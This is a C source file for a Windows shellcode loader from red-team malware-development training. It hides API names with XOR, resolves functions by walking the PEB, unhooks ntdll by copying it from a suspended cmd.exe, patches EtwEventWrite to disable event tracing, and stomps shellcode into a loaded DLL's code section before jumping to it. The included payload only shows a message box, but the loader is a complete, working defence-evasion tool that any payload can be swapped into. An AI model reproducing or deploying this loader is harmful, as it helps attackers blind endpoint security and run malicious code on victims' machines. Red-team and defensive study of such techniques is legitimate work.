/*implemented

AES encrypted payload [X]
Custom function resolving [X]
No strings [X]
Module stomping [X]
No new thread [X]
API Unhooking [X]
Event Unhooking [X]
Sleep obfuscation [???]

*/

#pragma once

#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "user32")

//defines required to parse through PEB/TEB (could probably include winternal.h instead ?)
typedef struct UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct LDR_DATA_TABLE_ENTRY {
    PVOID Reserved1[2];
    LIST_ENTRY InMemoryOrderLinks;
    PVOID Reserved2[2];
    PVOID DllBase;
    PVOID EntryPoint;
	PVOID SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct PEB_LDR_DATA {
    BYTE Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3;
	PVOID ImageBaseAddress;
    PEB_LDR_DATA * Ldr;
} PEB, *PPEB;

HMODULE WINAPI cGetModuleHandle(LPCWSTR moduleName);
FARPROC WINAPI cGetProcAddress( HMODULE hModule, LPCSTR lpProcName);

typedef BOOL (WINAPI * VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HMODULE (WINAPI * LoadLibraryA_t)(LPCSTR lpFileName);
typedef BOOL (WINAPI * ReadProcessMemory_t)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);

VirtualProtect_t VirtualProtect_p = NULL;
LoadLibraryA_t LoadLibraryA_p = NULL;
ReadProcessMemory_t ReadProcessMemory_p = NULL;

// MessageBox shellcode - 64-bit
unsigned char payload[] = {
  0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00,
  0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
  0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
  0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a,
  0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
  0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
  0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
  0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0,
  0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
  0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
  0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75,
  0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6,
  0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
  0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e,
  0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
  0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
  0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
  0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00,
  0x00, 0x3e, 0x48, 0x8d, 0x95, 0x1a, 0x01, 0x00, 0x00, 0x3e, 0x4c, 0x8d,
  0x85, 0x35, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
  0x56, 0x07, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6,
  0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c,
  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
  0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x48, 0x69, 0x20, 0x66, 0x72,
  0x6f, 0x6d, 0x20, 0x52, 0x65, 0x64, 0x20, 0x54, 0x65, 0x61, 0x6d, 0x20,
  0x4f, 0x70, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x21, 0x00, 0x52, 0x54,
  0x4f, 0x3a, 0x20, 0x4d, 0x61, 0x6c, 0x44, 0x65, 0x76, 0x90 };
unsigned int payload_len = sizeof(payload);

char vprotect[] = {0x29, 0x16, 0x0D ,0x0B ,0x0A ,0x1E ,0x13 ,0x2F ,0x0D ,0x10 ,0x0B ,0x1A ,0x1C ,0x0B, 0x00};
char llibrary[] = {0xD4, 0xF7, 0xF9, 0xFC, 0xD4, 0xF1, 0xFA, 0xEA, 0xF9, 0xEA, 0xE1, 0xD9, 0x00};
char rmemory[] =  {0x08, 0x3F, 0x3B, 0x3E, 0x0A, 0x28, 0x35, 0x39, 0x3F, 0x29, 0x29, 0x17, 0x3F, 0x37, 0x35, 0x28, 0x23, 0x00};
char etw[] = {0xE9, 0xD8, 0xDB, 0xE9, 0xDA, 0xC9, 0xC2, 0xD8, 0xFB, 0xDE, 0xC5, 0xD8, 0xC9,0x00};
char kernel32[] = {0x89, 0xA7, 0xB0, 0xAC, 0xA7, 0xAE, 0xF1, 0xF0, 0xEC, 0xA6, 0xAE, 0xAE, 0x00};
char windowsdll[] = {0xFD, 0xE3, 0xE4, 0xEE, 0xE5, 0xFD, 0xF9, 0xA4, 0xF9, 0xFE, 0xE5, 0xF8, 0xEB, 0xED, 0xEF, 0xA4, 0xEE, 0xE6, 0xE6, 0x00};
char ntdll[] = {0xDC, 0xC6, 0xD6, 0xDE, 0xDE, 0x9C, 0xD6, 0xDE, 0xDE, 0x00};
WCHAR wkernel32[sizeof(kernel32)];
WCHAR wntdll[sizeof(ntdll)];


// dumb char to wide char converter
void charToWide(char * string, WCHAR * unicode, SIZE_T string_len) {
	int i;
	for (i = 0; i <= string_len-1; ++i){
		unicode[i] = string[i];
	}
	
}

// xor decrypt from sektor
void XORcrypt(char str2xor[], size_t len, char key) {
    int i;

    for (i = 0; i < len; i++) {
        str2xor[i] = (BYTE)str2xor[i] ^ key;
    }
}

// aes decrypt from sektor
int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


// custom module resolver
HMODULE WINAPI cGetModuleHandle(LPCWSTR moduleName) {
		
	HMODULE modulePointer;
	
	//PEB base address retrieved from TEB
	#ifdef _M_IX86 
	PEB * pPEB = (PEB *) __readfsdword(0x30);
	#else
	PEB * pPEB = (PEB *)__readgsqword(0x60);
	#endif
	
	//return calling module's base address if no name provided
	if (moduleName == NULL)
		return (HMODULE) pPEB->ImageBaseAddress;

	//searching through Ldr for a matching DllName
	PEB_LDR_DATA * pLdr = pPEB->Ldr;
	
	LIST_ENTRY * pModuleList = &pLdr->InMemoryOrderModuleList;
	LIST_ENTRY * pLDTEntry = pModuleList->Flink;
	
	for (LIST_ENTRY * nextEntry = pLDTEntry; nextEntry != pModuleList; nextEntry = nextEntry->Flink){
		LDR_DATA_TABLE_ENTRY * pEntry = (LDR_DATA_TABLE_ENTRY *) ((BYTE *) nextEntry - sizeof(LIST_ENTRY));
		if (lstrcmpiW(pEntry->BaseDllName.Buffer, moduleName) == 0){
			modulePointer = (HMODULE) pEntry->DllBase;
			return modulePointer;
		}
	}

	return NULL;

}

// custom function resolver
FARPROC WINAPI cGetProcAddress( HMODULE hModule, LPCSTR lpProcName){
	
	char * reqFunction = (char *) lpProcName;
	char * baseAddr = (char *) hModule;
	
	FARPROC procAddress;
	
	//parse headers to find function addresses
	IMAGE_DOS_HEADER * dos_header = (IMAGE_DOS_HEADER *) baseAddr;
	IMAGE_NT_HEADERS * nt_header = (IMAGE_NT_HEADERS *) (dos_header->e_lfanew + baseAddr);
	IMAGE_OPTIONAL_HEADER * optional_header = (IMAGE_OPTIONAL_HEADER *) &nt_header->OptionalHeader;
	IMAGE_DATA_DIRECTORY * export_data_directory = &optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	IMAGE_EXPORT_DIRECTORY * export_directory = (IMAGE_EXPORT_DIRECTORY *) (export_data_directory->VirtualAddress + baseAddr);
	
	DWORD numOfNames = export_directory->NumberOfNames;
	DWORD * funcNamesAddress = (DWORD *) (export_directory->AddressOfNames + baseAddr);
	DWORD * funcAddress = (DWORD *) (export_directory->AddressOfFunctions + baseAddr);

	char * stringAddress;
	
	//finding index of function
	int indexForFunction;
	for (int i = 0; i < numOfNames; i++){
		stringAddress = baseAddr + funcNamesAddress[i];
		if (strcmp(stringAddress, reqFunction) == 0){
			procAddress = (FARPROC) (funcAddress[i] + baseAddr);			
		}
	}
	
	
	//check if function requires forwarding
	if ( (char *) procAddress > (char *) export_directory && (char *) procAddress <= (char *)(export_directory + export_data_directory->Size)) { 
		
		//seperate function name and library name (library.function)
		
		int chrCount = 0;
		char * dllName;
		char * funcName;
		char * stringCopy = _strdup((char *) procAddress);
		HMODULE libAddress;
		
		while (stringCopy[chrCount] != '.')
			chrCount++;
				
		stringCopy[chrCount] = 0x00;
		chrCount++;
		
		dllName = stringCopy;
		
		XORcrypt(llibrary, sizeof(llibrary)-1, 0x98);
		XORcrypt(kernel32, sizeof(kernel32)-1, 0xC2);
		
		//init LoadLibrary function
		LoadLibraryA_p = (LoadLibraryA_t) cGetProcAddress(cGetModuleHandle((LPCWSTR)kernel32),llibrary);
		
		//load the dll and call the function 
		libAddress = LoadLibraryA_p((LPSTR) dllName);
		funcName = stringCopy+chrCount;		
		procAddress = cGetProcAddress(libAddress, stringCopy);
		
		free(stringCopy);			
		if (!libAddress) return NULL;

	}
	
	return procAddress;	
}


int DisableETW(void) {
	DWORD oldprotect = 0;
		
	void * pEventWrite = cGetProcAddress(cGetModuleHandle(wntdll), (LPCSTR) etw);
	
	VirtualProtect_p(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);

#ifdef _WIN64
	memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); 		// xor rax, rax; ret
#else
	memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5);		// xor eax, eax; ret 14
#endif

	VirtualProtect_p(pEventWrite, 4096, oldprotect, &oldprotect);
	FlushInstructionCache(GetCurrentProcess(), pEventWrite, 4096);
	return 0;
}

//unhooking using suspended process
int Unhook(void) {
		
	STARTUPINFO si;
    PROCESS_INFORMATION pi;	
	//patterns to find first & last syscall
	BYTE syspattern[] = "\x0f\x05\xc3";
	BYTE intpattern[] = "\xcc\xcc\xcc";


    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );
	
	//create supsended cmd to copy the fresh ntdll before EDR hooks
	if(!CreateProcessA(
		NULL, 
		(LPSTR)"cmd.exe", 
		NULL, 
		NULL, 
		FALSE, 
		CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
		//CREATE_NEW_CONSOLE,
		NULL, 
		"C:\\Windows\\System32\\", 
		&si, 
		&pi)) return -1;
			
	//resolve local ntdll address since its always the same  
	HANDLE hNtdll = cGetModuleHandle(wntdll);
	
	if (!hNtdll) return -1;
	
	char * mempointer = (char *)hNtdll;
	//find first syscall
	int i = 0;
	while(memcmp(mempointer+i, syspattern, 3)) {
		i = i + 3;
	}
	
	//go to the beginning of first syscall instruction
	char * firstSyscall = mempointer+i;
	i = 0;
	while(memcmp(firstSyscall-i, intpattern, 3)) {
		i=i+3;
	}	
	
	//find final syscall
	firstSyscall = firstSyscall-i + 3;
	i = 0;
	while(memcmp(firstSyscall+i, intpattern, 3)) {
		i=i+3;
	}
		
	char * lastSyscall = firstSyscall+i;
	size_t sysSize = lastSyscall - firstSyscall;
	
	//transfer to local copy then terminate cmd
	
	void * copy = VirtualAlloc(NULL, sysSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	SIZE_T bytesRead = 0;
	DWORD oldProtect;
	
	if (!ReadProcessMemory_p(pi.hProcess, firstSyscall, copy, sysSize, &bytesRead)) {
		TerminateProcess(pi.hProcess, 0);
		return -1;
	} else {	
		TerminateProcess(pi.hProcess, 0);
	}
	
	// protection stuff & copying
	if (!VirtualProtect_p( firstSyscall, sysSize, PAGE_EXECUTE_READWRITE, &oldProtect)) return -1;
	if (!memcpy(firstSyscall, copy, sysSize)) return -1;
	if (!VirtualProtect_p(firstSyscall, sysSize, oldProtect, &oldProtect)) return -1;	
	
	VirtualFree(copy, 0, MEM_RELEASE);

	
	return 0;
}

int main(void) {
	
	DWORD oldProtect;
	
	XORcrypt(rmemory, sizeof(rmemory)-1, 0x5A);
	XORcrypt(vprotect, sizeof(vprotect)-1, 0x7f);
	XORcrypt(llibrary, sizeof(llibrary)-1, 0x98);
	XORcrypt(etw, sizeof(etw)-1, 0xAC);
	XORcrypt(kernel32, sizeof(kernel32)-1, 0xC2);
	XORcrypt(windowsdll, sizeof(windowsdll)-1, 0x8A);
	XORcrypt(ntdll, sizeof(ntdll)-1, 0xB2);
	
	charToWide(ntdll,wntdll,sizeof(ntdll));
	charToWide(kernel32,wkernel32, sizeof(kernel32));
	
	VirtualProtect_p = (VirtualProtect_t) cGetProcAddress(cGetModuleHandle(wkernel32), (LPCSTR) vprotect);
	LoadLibraryA_p = (LoadLibraryA_t) cGetProcAddress(cGetModuleHandle(wkernel32), (LPCSTR) llibrary);
	ReadProcessMemory_p = (ReadProcessMemory_t) cGetProcAddress(cGetModuleHandle(wkernel32), (LPCSTR) rmemory);
	
	//unhook
	if (Unhook() < 0){
		return -1;
	}

	//disable ETW
	DisableETW();

	// load the library
	HMODULE lib = LoadLibraryA_p(windowsdll);
	
	if (!lib) return -1;
	
	// ptr for library .text
	char * lib_ptr = (char *)lib + 4096;
	
	//make .text writeable
	if(!VirtualProtect_p( lib_ptr, payload_len, PAGE_READWRITE, &oldProtect)) return -1;
	
	// copy shellcode
	if (!memcpy(lib_ptr, payload, payload_len)) return -1;
	
	//restore protections
	if (!VirtualProtect_p( lib_ptr, payload_len, oldProtect, &oldProtect)) return -1;

	//jump to code
	//CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)lib_ptr, NULL, 0, 0);
	void (*go)() = (void (*)()) lib_ptr; go();
	
	return -1;
}
